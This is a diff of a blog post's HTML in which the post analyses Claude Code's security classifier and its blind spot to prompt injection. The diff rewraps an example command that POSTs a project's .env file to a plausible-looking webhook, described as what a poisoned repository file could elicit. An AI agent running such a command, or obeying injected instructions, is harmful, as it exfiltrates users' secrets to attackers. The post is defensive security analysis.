@@ -35,7 +35,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/rmmod.com\/posts\/agent\/claude-code-security\/"
-        },"genre": "posts","keywords": "Agent, Infra, Harness","wordcount":  1436 ,
+        },"genre": "posts","keywords": "Agent, Infra, Harness","wordcount":  1437 ,
         "url": "https:\/\/rmmod.com\/posts\/agent\/claude-code-security\/","datePublished": "2026-04-02T00:00:00+00:00","dateModified": "2026-04-02T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -79,7 +79,7 @@
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">I Read Claude Code&#39;s Security Source Code. Here&#39;s What It Can&#39;t Solve.</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>guanlan</a>
 </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-04-02">2026-04-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1436 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-04-02">2026-04-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1437 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -170,8 +170,15 @@
 <li>The genuinely intractable challenge, however, is this: even if every one of these specifics were remedied, the classifier still only sees the final command — not the provenance of how that command came to be contaminated.</li>
 </ul>
 <p>These are, individually, tractable engineering problems. The truly formidable challenge is a structural contradiction: traditional security thinking assumes the model may be adversarial while the user is cooperative. Prompt injection inverts this relationship. The model remains cooperative — it faithfully executes what it believes to be user instructions, even when those instructions have been poisoned.</p>
-<pre><code class="">curl -X POST https://webhook.legitimate-looking-service.com/notify -d @.env</code></pre>
-<p>The semantics of this command are straightforward: POST the contents of <code>.env</code> to an external webhook. In many development contexts, dispatching data to webhooks is entirely routine — CI notifications, monitoring, deployment triggers all follow this pattern. The classifier sees a curl POST request, a plausible-looking domain, and a behavioral pattern well within the bounds of everyday developer operations. But if this command was elicited through prompt injection via a compromised file in the repository, it is exfiltrating your environment variables directly to an attacker.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -X POST https://webhook.legitimate-looking-service.com/notify -d @.env
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The semantics of this command are straightforward: POST the contents of <code>.env</code> to an external webhook. In many development contexts, dispatching data to webhooks is entirely routine — CI notifications, monitoring, deployment triggers all follow this pattern. The classifier sees a curl POST request, a plausible-looking domain, and a behavioral pattern well within the bounds of everyday developer operations. But if this command was elicited through prompt injection via a compromised file in the repository, it is exfiltrating your environment variables directly to an attacker.</p>
 <h2 id="what-claude-code-leaves-unsolved">What Claude Code Leaves Unsolved</h2>
 <p>Everything discussed thus far concerns how to securely operate a shell-privileged agent on a single developer&rsquo;s machine.</p>
 <p>But long-horizon agent workflows are rapidly outgrowing this perimeter. The moment an agent begins sending emails, mutating databases, or triggering payments, the question is no longer whether a particular command is dangerous. It becomes whether the side effect has been committed, whether it can be unwound, and who assumes control when things go wrong. At this point, the system should be governing not commands but effects: who granted the capability, who initiated the invocation, which external actions have already materialized, and which remain pending. And confronted with such operations, the system should no longer be limited to two options — permit or kill. It needs a third capability: suspension. Halting the operation at the boundary, preserving both state and context, and waiting until policy approval, human confirmation, or automated recovery logic is ready — only then deciding whether to proceed, roll back, or hand over to a human operator.</p>
